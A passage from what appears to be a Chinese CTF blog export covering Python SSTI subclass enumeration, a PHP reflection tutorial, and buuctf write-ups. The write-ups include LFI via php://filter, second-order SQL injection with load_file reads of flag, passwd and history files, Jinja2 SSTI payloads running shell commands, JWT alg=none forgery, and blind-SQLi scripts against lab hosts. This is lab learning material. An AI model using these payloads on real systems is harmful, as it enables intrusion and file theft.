'compile')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, '__import__')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'compile')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open')(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile')(72, 20, &lt;class 'site._Printer'&gt;, 'file')(72, 20, &lt;class 'site._Printer'&gt;, 'exec')(72, 23, &lt;class 'site._Printer'&gt;, '__import__')(72, 23, &lt;class 'site._Printer'&gt;, 'file')(72, 23, &lt;class 'site._Printer'&gt;, 'compile')(72, 23, &lt;class 'site._Printer'&gt;, 'eval')(72, 23, &lt;class 'site._Printer'&gt;, 'open')(72, 23, &lt;class 'site._Printer'&gt;, 'execfile')(77, 20, &lt;class 'site.Quitter'&gt;, 'file')(77, 20, &lt;class 'site.Quitter'&gt;, 'exec')(77, 23, &lt;class 'site.Quitter'&gt;, '__import__')(77, 23, &lt;class 'site.Quitter'&gt;, 'file')(77, 23, &lt;class 'site.Quitter'&gt;, 'compile')(77, 23, &lt;class 'site.Quitter'&gt;, 'eval')(77, 23, &lt;class 'site.Quitter'&gt;, 'open')(77, 23, &lt;class 'site.Quitter'&gt;, 'execfile')(78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, '__import__')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'compile')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile')(79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, '__import__')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'compile')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile')----------4-----------(60, '__import__')(60, 'file')(60, 'repr')(60, 'compile')(60, 'eval')(60, 'open')(60, 'execfile')进一步获取可以直接执行命令或者读取文件的类----------1----------- (40, 'file') ----------2----------- (59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open']) (77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__']) (77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open']) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None) ----------3----------- (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile') (72, 20, &lt;class 'site._Printer'&gt;, 'file') (72, 20, &lt;class 'site._Printer'&gt;, 'exec') (72, 23, &lt;class 'site._Printer'&gt;, 'file') (72, 23, &lt;class 'site._Printer'&gt;, 'eval') (72, 23, &lt;class 'site._Printer'&gt;, 'open') (72, 23, &lt;class 'site._Printer'&gt;, 'execfile') (77, 20, &lt;class 'site.Quitter'&gt;, 'file') (77, 20, &lt;class 'site.Quitter'&gt;, 'exec') (77, 23, &lt;class 'site.Quitter'&gt;, 'file') (77, 23, &lt;class 'site.Quitter'&gt;, 'eval') (77, 23, &lt;class 'site.Quitter'&gt;, 'open') (77, 23, &lt;class 'site.Quitter'&gt;, 'execfile') (78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile') (79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile') ----------4----------- (60, 'file') (60, 'repr') (60, 'eval') (60, 'open') (60, 'execfile') 小结：梳理了一遍以后，感觉其实ssti注入也不难，难的是一开始面对啥也不懂的手足无措，不知道从哪入手，现在可能还是有一些小点不是很懂，但是终于是没那么陌生了 参考:https://xz.aliyun.com/t/6885#toc-1https://www.anquanke.com/post/id/226900#h3-14https://xz.aliyun.com/t/3679#toc-9https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5https://xz.aliyun.com/t/8029#toc-7https://www.freebuf.com/articles/network/258136.htmlhttps://juejin.cn/post/6908600736754434056#heading-13","link":"/2021/02/28/python-SSTI%E6%B3%A8%E5%85%A5/"},{"title":"CTF中的php反射","text":"反射是什么？它是指在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。 其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。 PHP反射api由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。 反射api是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。 平常我们用的比较多的是 ReflectionClass类 和 ReflectionMethod类，例如： &lt;?php``class` `Person``{`` ``/**`` ``* For the sake of demonstration, we&quot;re setting this private`` ``*/`` ``private` `$_allowDynamicAttributes` `= false;` ` ``/**`` ``* type=primary_autoincrement`` ``*/`` ``protected` `$id` `= 0;` ` ``/**`` ``* type=varchar length=255 null`` ``*/`` ``protected` `$name``;` ` ``/**`` ``* type=text null`` ``*/`` ``protected` `$biography``;` ` ``public` `function` `getId()`` ``{`` ``return` `$this``-&gt;id;`` ``}` ` ``public` `function` `setId(``$v``)`` ``{`` ``$this``-&gt;id = ``$v``;`` ``}` ` ``public` `function` `getName()`` ``{`` ``return` `$this``-&gt;name;`` ``}` ` ``public` `function` `setName(``$v``)`` ``{`` ``$this``-&gt;name = ``$v``;`` ``}` ` ``public` `function` `getBiography()`` ``{`` ``return` `$this``-&gt;biography;`` ``}` ` ``public` `function` `setBiography(``$v``)`` ``{`` ``$this``-&gt;biography = ``$v``;`` ``}``} 一、通过ReflectionClass，我们可以得到Person类的以下信息： 常量 Contants 属性 Property Names 方法 Method Names静态 属性 Static Properties 命名空间 Namespace Person类是否为final或者abstract Person类是否有某个方法 接下来反射它，只要把类名”Person”传递给ReflectionClass就可以了： $class` `= ``new` `ReflectionClass(``'Person'``); ``// 建立 Person这个类的反射类 ``$instance` `= ``$class``-&gt;newInstanceArgs(``$args``); ``// 相当于实例化Person 类 1）获取属性(Properties)： &lt;?php``$properties` `= ``$class``-&gt;getProperties();``foreach` `(``$properties` `as` `$property``)``{`` ``echo` `$property``-&gt;getName() . ``&quot;\\n&quot;``;``}``// 输出:``// _allowDynamicAttributes``// id``// name``// biography 默认情况下，ReflectionClass会获取到所有的属性，private 和 protected的也可以。如果只想获取到private属性，就要额外传个参数： $private_properties` `= ``$class``-&gt;getProperties(ReflectionProperty::IS_PRIVATE); 可用参数列表： ReflectionProperty::IS_STATIC ReflectionProperty::IS_PUBLIC ReflectionProperty::IS_PROTECTED ReflectionProperty::IS_PRIVATE 通过$property-&gt;getName()可以得到属性名。 2）获取注释： 通过getDocComment可以得到写给property的注释。 &lt;?php``foreach` `(``$properties` `as` `$property``)``{`` ``if` `(``$property``-&gt;isProtected())`` ``{`` ``$docblock` `= ``$property``-&gt;getDocComment();`` ``preg_match(``'/ type\\=([a-z_]*) /'``, ``$property``-&gt;getDocComment(), ``$matches``);`` ``echo` `$matches``[1] . ``&quot;\\n&quot;``;`` ``}``}``// Output:``// primary_autoincrement``// varchar``// text 3）获取类的方法 getMethods() 来获取到类的所有methods。 hasMethod(string) 是否存在某个方法 getMethod(string) 获取方法 4）执行类的方法： $instance``-&gt;getName(); ``// 执行Person 里的方法getName``// 或者：``$method` `= ``$class``-&gt;getmethod(``'getName'``); ``// 获取Person 类中的getName方法``$method``-&gt;invoke(``$instance``); ``// 执行getName 方法``// 或者：``$method` `= ``$class``-&gt;getmethod(``'setName'``); ``// 获取Person 类中的setName方法``$method``-&gt;invokeArgs(``$instance``, ``array``(``'snsgou.com'``)); 二、通过ReflectionMethod，我们可以得到Person类的某个方法的信息： 是否“public”、“protected”、“private” 、“static”类型 方法的参数列表 方法的参数个数 反调用类的方法 &lt;?php``// 执行detail方法 $method`= new ReflectionMethod('Person', 'test');``if` `(``$method``-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic())``{`` ``echo` `'Action is right'``;``}``echo` `$method``-&gt;getNumberOfParameters(); ``// 参数个数``echo` `$method``-&gt;getParameters(); ``// 参数对象数组","link":"/2021/05/15/CTF%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/"},{"title":"buuctf16","text":"[Zer0pts2020]Can you guess it?查看源码: &lt;?phpinclude 'config.php'; // FLAG is defined in config.phpif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(&quot;I don't know what you are thinking, but I won't let you read it :)&quot;);}if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit();}$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if (hash_equals($secret, $guess)) { $message = 'Congratulations! The flag is: ' . FLAG; } else { $message = 'Wrong.'; }}?&gt; 代码分为两个部分，先说下面吧，让我们比对一个secret，看了一下，根本不可能爆破跑出来的 所以重点应该在上部分，说flag在config.php当中，并且还用了一个正则匹配waf掉config.php，有那种防止我们直接读取的味道，然后下面getsource中，对于我们传入的php_self也是可以直接显示的，所以猜想关键点是绕过这里几个点学习一下吧:1.$_SERVER[‘PHP_SELF’]是什么？ $_SERVER['PHP_SELF'] 表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关。假设我们有如下网址，$_SERVER[‘PHP_SELF’]得到的结果分别为：http://www.baicai.link/index/ ：/index/index.phphttp://www.baicai.link/cate/miandan.html ：/cate/miandan.htmlhttp://www.baicai.link/php/index.php?test=foo ：/php/index.phphttp://www.baicai.link/php/index.php/test/foo ：/php/index.php/test/foo 所以很明显php_self是我们可控的，接下来看看能否尝试绕过正则匹配就需要看看basename()有没有什么特性，比如php字符串的规则啥的~ 在php手册中，我们发现如果路径包含对当前区域设置无效的字符，则basename()的行为未定义。 所以接下来我们来构造一下payload:我们知道phpself获取的是最后一个/后的内容，我们直接输入 /config.php?source 是不行的——这样变成我们执行的是config.php的内容所以应该是 /index.php/config.php 此时执行的index.php，获取的是config.php接下来是绕过正则匹配 /index.php/config.php/我认为?source= [CISCN2019 华北赛区 Day1 Web5]CyberPunk查看源码，发现file，可以打开文件，于是想到文件包含，试试伪协议读取文件，发现可以payload: ?file=php://filter/convert.baase64-encode/resource=index.php &lt;?php//index.phpini_set('open_basedir', '/var/www/html/');// $file = $_GET[&quot;file&quot;];$file = (isset($_GET['file']) ? $_GET['file'] : null);if (isset($file)){ if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) { echo('no way!'); exit; } @include($file);}?&gt; &lt;?php//search.phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); if(!$row) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;&lt;p&gt;å§å:&quot;.$row['user_name'].&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;.$row['phone'].&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;.$row['address'].&quot;&lt;/p&gt;&quot;; } else { $msg = &quot;æªæ¾å°è®¢å!&quot;; }}else { $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;}?&gt; &lt;?php//change.phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`='&quot;.$address.&quot;', `old_address`='&quot;.$row['address'].&quot;' where `user_id`=&quot;.$row['user_id']; $result = $db-&gt;query($sql); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;è®¢åä¿®æ¹æå&quot;; } else { $msg = &quot;æªæ¾å°è®¢å!&quot;; }}else { $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;}?&gt; &lt;?php//confirm.phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if($fetch-&gt;num_rows&gt;0) { $msg = $user_name.&quot;å·²æäº¤è®¢å&quot;; }else{ $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;è®¢åæäº¤æå&quot;; }} else { $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;}?&gt; &lt;?php//delete.phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $result = $db-&gt;query('delete from `user` where `user_id`=' . $row[&quot;user_id&quot;]); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;è®¢åå é¤æå&quot;; } else { $msg = &quot;æªæ¾å°è®¢å!&quot;; }}else { $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;}?&gt; 审计一下可以发现，本题中没有对address进行过滤，所以需要我们构造语句真好 phpstorm崩溃了想到之前sqlilabs刷的二次注入，一开始的change.php中只对address进行了 addslashes处理然后就进行了update处理所以我的思路是这样的，先存一个address，然后用change插入注入语句，因为插入到表中以后转义的字符时不存在的，取出来也就不存在了，payload: 1' where `user_id`=extractvalue(1,concat('~',(select load_file('/flag.txt'))))# 至于为啥想读文件，因为表里没有–最后这里看了一下wp，毕竟文件名要猜== [网鼎杯 2018]Comment又是一题二次注入首先是登录账号是zhangwei 密码是zhagnwei666 后面数字直接爆破就行了进去以后啥都没有，猜测是存在文件泄露——发现git泄露，扫描一波： &lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; 思路很明确了。我们需要利用category这个参数来传入值首先我们利用write传值，然后利用comment改值传入: 2',content=(select database()),/* 这里解释一下 我们需要用/**/这个注释符，因为从源码中我们可以看出，他是多行的，所以我们需要选择多行注释符接下来点击详情 输入 */# 进行闭合 并注释后面的内容 可以看到如下 接下来就是常规注入，但是没有发现flag，这里新学了一种思路我们查看user()发现是root权限 既然是root权限，那么大概率其实应该是读取文件~接下来就是寻找的一个过程了，这里学了一下学长的思路~很牛！我们查看etc/passwd 发现www用户的存在，于是这个时候 我们可以选择继续查看 有时历史记录命令未存储在.bash_history中 bash_history的记录 看看是否有线索：得到较完整路径，并且看到 .DS_Store 的存在 .DS_Store 是系统自动生成的一个隐藏的文件，存贮目录的自定义属性所以我们可以看看其中的信息 目标环境是docker，所以 .DS_Store 文件应该在 /tmp 中。而 .DS_Store 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： ',content=(select hex(load_file('/tmp/html/.DS_Store'))),/* 找到flag，最终payload ',content=(select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*","link":"/2021/05/22/buuctf16/"},{"title":"buuctf17","text":"[RCTF2015]EasySQL又是二次注入，注册登录改密 &lt;?phpsession_start();header(&quot;Content-Type: text/html; charset=UTF-8&quot;);require_once 'config.php';echo '&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;p&gt;oldpass: &lt;input type=&quot;text&quot; name=&quot;oldpass&quot; /&gt;&lt;/p&gt;&lt;p&gt;newpass: &lt;input type=&quot;text&quot; name=&quot;newpass&quot; /&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;';if(isset($_POST['oldpass']) &amp;&amp; isset($_POST['newpass'])){ $oldpass = md5($_POST['oldpass']); $newpass = md5($_POST['newpass']); $username = $_SESSION['username']; $sql = &quot;update users set pwd='$newpass' where name=\\&quot;$username\\&quot; and pwd='$oldpass'&quot;; // var_dump($sql); $query = mysql_query($sql); if($query){ exit(''); }else{ die(mysql_error()); }}?&gt; 直接看这段代码吧，username此时是没有被md5加密的，也就是说这是我们的利用点 function check($string){ //$string = preg_replace(&quot;#(\\s)|(/\\*.*\\*/)#i&quot;, &quot;&quot;, $string); $postfilter = &quot;#(\\s)|(/\\*.*\\*/)|file|insert|&lt;|and|floor|ord|char|ascii|mid|left|right|hex|sleep|benchmark|substr|@|`|delete|like#i&quot;; if(preg_match($postfilter, $string,$matches)) { echo &quot;&lt;script&gt;alert('invalid string!')&lt;/script&gt;&quot;; die(); } else return $string;} 这是过滤内容，所以我们可以闭合username adm&quot;extractvalue(1,concat(database()))# z这边看到一个师傅的payload test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&amp;&amp;(column_name)regexp('^r'))),1)# 有意思的是 flag所在的列名没有完全出来，于是就使用了正则匹配匹配字符r得到flag 最后要记得翻转哈，不然长度限制了 [CSCCTF 2019 Qual]FlaskLight查看源码有提示，SSTI注入直接上payload 怎么说 我忘记保存了– 一开始没发现过滤东西，找到了读文件的file方法，但是不知道flag位置于是尝试其他方法，发现会跳转500，感觉是什么被过滤了，发现是globals 尝试一下绕过：发现拼接法可以绕过: {{&quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen(&quot;ls&quot;).read()}} 接下来就可以随便使用命令这里没用builitins当跳板，因为eval被禁用了，直接用上面这个更简洁 然后这里说一下wp的方法，感觉挺新奇的: inux下有一个文件/proc/self/environ，这个文件里保存了系统的一些变量。 {{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40]('/flasklight/app.py').read()}} 读取源码发现提示: CCC{the_flag_is_this_dir} 但是不知道flag的文件名WP说可以利用subprocess.Popen这个类，无需globals也可以进行读取 import requestsurl=&quot;http://202f932e-6c5b-47c0-9de9-0a1627399bb6.node3.buuoj.cn/?search=&quot;s=requests.session()for i in range(1,1000): payload = &quot;{{''.__class__.__mro__[-1].__subclasses__()[%s]}}&quot;%i print(payload) if 'subprocess.Popen' in s.get(url+payload).text: print(i) break 结果是258payload: {{[].__class__.__bases__[0].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}} 不过也挺麻烦的== [HITCON 2017]SSRFme&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; } echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); 之前做过了 在i春秋10 就是利用get里面的perl命令执行，然后这题好像没有flag– [HFCTF2020]EasyLogin注册——登录 F12查看源码: /** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ 知道是koa-static 不知道是个啥 是node.js吧？于是乎去学习一下看了一下wp说是要在controllers下的api.js才是真正的源码 node.js由于本题是基于koa框架的，所以需要了解他的一些基础信息 koa框架常用目录、文件 看了这个框架后很明显，我们需要找的是处理逻辑，但是本题中，处理逻辑放在controllers/api.js文件下（经验），有的controllers默认目录下的文件就是api.js const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = { 'POST /api/register': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length &gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});//jwt验证 ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username &amp;&amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) =&gt; { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) =&gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); }}; 看了一下代码，主要是是要伪造jwt为admin然后就可以读取flag惹=-=印象中之前也做过一题伪造jwt了 吧这个autho啥的拿去https://jwt.io/这个网站解码然后jwt会防篡改，这里绕过的姿势就是将HS256改为none，然后构造: {&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}.{&quot;secretid&quot;: [],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1623114083}.ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTYyMzEzMzA0NX0.Qjxs0QkJ0e_Sjrn8WbCPKaE5kFouERQY8RZ6nGctW6Q 记得将username换成admin，然后登陆进去以后抓包按getflag就行 jwt攻击小结jwt就是一种验证方式，思路就是拿到密文，然后去网站解密https://jwt.io/，修改其中的值，再加密回去，本地能绕过是因为验证方式比较简单：首先签名算法确保恶意用户在传输过程中不会修改JWT，但是jwt支持无签名算法，**所以如果将alg的加密方式改为none**，就不用对jwt进行签名，这样jwt的存在就没有意义了。 secret更改为数组的原因是也是和上面的更改none方法相呼应，因为只有secret更改为空这个方法才有效但是本题为什么更改为数组？为什么不直接放空白，这点在他的源码有写，secret不能为空js是弱类型语言，secret设为一个数组或小数，比较永远为真，但是并且不为空。 攻击思路:注册获得jwt——更改jwt——重新进入 [GYCTF2020]EzsqliSQL注入，数字型注入，过滤infomation，推测要无列名注入了接下来测试一下注入点发现 id=1和id=2回显不一样 这里有个细节需要说一下，由于and被过滤了，&amp;&amp;在url传输过程中有其他含义，不好用，所以这里用的|，但是用|的话就需要我们让id=2，这样 两个都错才是v&amp;n，一个对一个错就是nu1l，如果是id=1，就会一直是nu1l 接下来就贴脚本惹: import requestsurl=&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;s=requests.session()database=&quot;&quot;for i in range(1,100000000): low=0 high=264 mid = (low + high) // 2 while(low&lt;high): #payload_1=f&quot;2||ascii(substr(database(),{i},1))&gt;{mid}&quot;#爆库give_grandpa_pa_pa_pa #payload_2=f&quot;2||ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),{i},1))&gt;{mid}&quot;#f1ag_1s_h3r3_hhhhh payload_2 = f&quot;2||ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),{i},1))&gt;{mid}&quot;#像无列名注入很经常列名都是flag，好几次了， #print(payload_2) #payload_2= data={ &quot;id&quot;:payload_2 } print(s.post(url,data=data).text) if &quot;Nu1L&quot; in s.post(url,data=data).text: low=mid+1 else: high=mid mid = (low + high) // 2 if (mid == 0 or mid == 264): break 